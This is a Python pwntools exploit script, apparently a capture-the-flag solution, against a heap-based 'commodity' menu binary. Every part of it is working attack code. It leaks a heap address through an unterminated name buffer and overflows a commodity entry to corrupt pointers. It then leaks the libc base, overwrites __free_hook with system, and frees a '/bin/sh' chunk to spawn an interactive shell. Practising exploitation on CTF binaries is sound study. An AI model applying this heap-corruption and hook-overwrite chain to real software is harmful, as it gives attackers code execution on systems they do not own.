#coding=utf-8
from pwn import *
local = 1
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    set $ptr = ($text_base+0x0000000002030E0)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice:",str(idx))
def add(desc_size,desc,com_size,content):
    menu(1)
    a.sendlineafter(" size.\n",str(desc_size))
    a.sendafter("please tell me the desrcript of commodity.\n",desc)
    a.sendlineafter("commodity-name's size.",str(com_size))
    a.sendafter("please tell me the commodity-name.\n",content)
def showAll():
    menu(3)
    a.sendlineafter("Do you want to display all commodity?","1")
def Show(idx):
    menu(3)
    a.sendlineafter("Do you want to display all commodity?","2")
    a.sendlineafter("The index is ",str(idx))
def EditName(name):
    menu(6)
    a.sendafter("Change your name(1~32):",name)
def Edit(idx,desc,com):
    menu(2)
    a.sendlineafter("The index is ",str(idx))
    a.sendafter("commodity's name.\n",com)
    a.sendafter("desrcription.\n",desc)
def delete(idx):
    menu(5)
    a.sendlineafter("Do you want to empty all commodity?\n","2")
    a.sendlineafter("The index is ",str(idx))
a.sendafter("Enter your name(1~32):",'A'*32+'\n')

add(0x88,'A\n',0x88,'A\n')
add(0x88,'A\n',0x88,'A\n')
showAll()
a.recvuntil("A"*32)
heap_addr = u64(a.recv(6)+'\x00\x00')-0x130
fuck(heap_addr)
payload='A'*0x60+p64(0x88)#size
payload+=p64(heap_addr+0x1f0)
payload+=p64(0x88)
payload+=p64(heap_addr+0x100)
Edit(0,"A\n",payload+'\n')
EditName("A"*32+'\n')
delete(1)
showAll()
a.recvuntil("commodity's name is ")
libc_base=u64(a.recv(6)+'\x00\x00')-libc.symbols["__malloc_hook"]-0x10-88
fuck(libc_base)
__free_hook = libc_base+libc.symbols["__free_hook"]
system_addr = libc_base+libc.symbols["system"]

payload=p64(0x88)#size
payload+=p64(__free_hook-8)
payload+=p64(0x88)
payload+=p64(__free_hook-8)
Edit(0,payload+'\n',"A\n")
Edit(0,"/bin/sh\x00"+p64(system_addr)+'\n',"/bin/sh\x00"+p64(system_addr)+'\n')

delete(0)





a.interactive()


